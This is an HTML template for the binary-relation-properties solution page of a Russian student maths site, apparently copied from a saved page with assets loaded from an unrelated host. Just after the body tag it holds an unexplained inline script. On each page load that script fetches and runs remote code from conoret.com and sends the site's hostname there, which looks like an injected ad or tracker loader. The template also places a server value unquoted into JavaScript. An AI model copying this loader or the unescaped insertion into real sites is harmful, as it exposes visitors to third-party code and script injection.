
﻿<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru-ru" lang="ru-ru" dir="ltr">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Свойства Бинарных Отношений(СБО)</title> 
    <link rel="stylesheet" href="static/content/StylesheetSlup.css">
    <script src="static/scripts/Assymetrical.js"></script>

	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<base href="/solutionSBO">
	<meta name="author" content="Super User">
	<meta name="generator" content="">
	<title>Математическое моделирование</title>
	<link href="assets/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
   
	<link href="https://gg.looknewsite.ru/assets/bootstrap.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/bootstrap-select.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/owl.carousel.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/animate.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/Chart.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/css2" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/rostsayt.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/template.css" rel="stylesheet">
   
	<script src="https://gg.looknewsite.ru//assets/jquery-3.5.1.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/jquery.validate.js"></script>
	<script src="https://gg.looknewsite.ru//assets/popper.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/bootstrap.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/bootstrap-select.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/owl.carousel.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/wow.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/jquery.mask.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/Chart.bundle.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/Chart.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/rostsayt.js"></script>
	<script src="https://gg.looknewsite.ru//assets/template.js"></script>
	<script src="https://gg.looknewsite.ru//assets/context.js"></script>
	<script src="https://gg.looknewsite.ru//assets/ammap.js"></script>
	<script src="https://gg.looknewsite.ru//assets/russiaLow.js"></script>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes">
    <meta name="HandheldFriendly" content="true">
    <meta name="apple-mobile-web-app-capable" content="YES">

	<style>        
        #navbar {
            background-color: black;
            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
            font-color: #32CD32;
            font-size: 1.25rem;
        }

        body {
            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
            margin: 0 auto; /* Центрирование по горизонтали */
            padding: 0;
            width: 90%; /* Ширина 70% */
            background-color: #000; /* Черный фон */
            color: #fff; /* Белый текст */
   
        }

        #top_menu .nav.menu li {
            white-space: nowrap; /* Предотвращает перенос элементов на новую строку */
        }

        #top_menu .nav.menu li {
             text-decoration: none; /* Убираем подчеркивание ссылок */
            white-space: nowrap; /* Предотвращает перенос элементов на новую строку */
            margin-right: 35px; /* Установите нужный размер отступа */
            opacity: 0; /* Устанавливаем начальную прозрачность */
            transform: translateY(-50px); /* Начальное положение элементов */
            animation: fadeInDown 2s ease forwards; /* Применяем анимацию */
        }

        @keyframes fadeInDown {
            from {
                opacity: 0; /* Начальная прозрачность */
                transform: translateY(-50px); /* Начальное положение */
            }
            to {
                opacity: 1; /* Конечная прозрачность */
                transform: translateY(0); /* Конечное положение */
            }
        }      

        #top_menu .nav.menu li a:hover {
            color: #32CD32; /* Здесь указываете желаемый зеленый цвет текста */
        }

        #top_menu ul {
            display: flex;
            flex-wrap: nowrap; /* запрещаем перенос элементов на новую строку */
            justify-content: space-between; /* равномерное распределение элементов по горизонтали */
            align-items: center; /* выравнивание элементов по вертикали */
             text-decoration: none; /* Убираем подчеркивание ссылок */
        }  
    </style>

</head>
<body class="home" cz-shortcut-listen="true">
    <script type="text/javascript">
    window.top === window &&
        !function(){
            var e=document.createElement("script"),
                t=document.getElementsByTagName("head")[0];
            e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),
            e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)
        }();
    </script>
    <!-- BEGIN WAYBACK TOOLBAR INSERT -->
    <!-- END WAYBACK TOOLBAR INSERT -->
    <div id="body">
        <header class="navbar navbar-expand-xl navbar-light" id="navbar">
            <div class="container">
                <div class="collapse navbar-collapse" id="navbar-content">
                    <div id="top_menu" class="navbar-nav ml-5 w-100">
                        <ul class="nav menu w-100 justify-content-between align-items-center header-top-menu mod-list">
                            
                            <li class="item-102"><a href="/home">Главная</a></li>
                            
                            <li class="item-102"><a href="/Var1Binary">Вид бинарных отношений</a></li>

                            <li class="item-103"><a href="/sbo">Свойство бинарных отношений</a></li>
                            <li class="item-104"><a href="/max">Максимальный поток в сети</a></li>
                            <li class="item-105"><a href="/gc">Гамельтонов цикл</a></li>
                            <li class="item-106"><a href="/about">Об авторах</a></li>
                            <li class="item-107">
                                <a href="/#mod-form1"></a>
                            </li>
                            <li class="item-112 work-in-pride-link">
                                <a href="http://workinpride.ru/rus" class="work-in-pride-link" target="_blank" rel="noopener noreferrer">Работай в компании Green Pride</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </header> 
    </div>
    <div class="content-container">
        <div id="theorySection" class="section">
           
            <h2>Решение</h2>
          
            <button id="buttonDownload" name="buttonDownload" class="button" onclick="downloadFile()" >Скачать html файл графа</button>
            <script>
                document.getElementById('buttonDownload').addEventListener('click', function () {
                    // Получаем текущую дату и время
                    const currentDate = new Date().toLocaleString();
                    // Получаем содержимое всей страницы
                    const content = `<!-- Saved on: ${ currentDate } -->\n${ document.documentElement.outerHTML }`;
                    // Создаем объект Blob для сохранения данных
                    const blob = new Blob([content], { type: 'text/html' });
                    // Создаем ссылку для скачивания файла
                    const url = URL.createObjectURL(blob);
                    // Создаем ссылку для элемента <a>, чтобы пользователь мог скачать файл
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = 'graph.html'; // Задаем имя файла для скачивания
                    // Добавляем ссылку на страницу и эмулируем щелчок на ней
                    document.body.appendChild(link);
                    link.click();
                    // Удаляем ссылку из DOM
                    document.body.removeChild(link);
                    // Освобождаем объект URL
                    URL.revokeObjectURL(url);
                });
            </script>
          
            <p id="propDataThree" style="font-size: 18px;">Бинарное отношение: {{dataThree}} </p>
            <p id="propDataOne" style="font-size: 18px;">Свойства: {{dataOne}} </p>
            <p id="propDataTwo" style="font-size: 18px;">Обратное отношение: {{dataTwo}}</p>
            <p id="propDataA" style="font-size: 18px;">Множество: {{dataA}} </p>
            %include('graph.html')
        </div>
    </div>
    <script>
        window.onload = function() {
            const buttonOur = document.getElementById('buttonDownload');
            var dataTwo = {{dataTwo}};
        
            if (dataTwo === 'Неверные данные') {
                buttonOur.disabled = true;
            } else {
                buttonOur.disabled = false;
            }
        }
    </script>
    
    <footer class="footer text-center">
        <div class="container">
            <p style="color: #f0f0f0;">&copy; 2024 Все права защищены</p>
        </div>
    </footer>
 </body>
   
 </html>

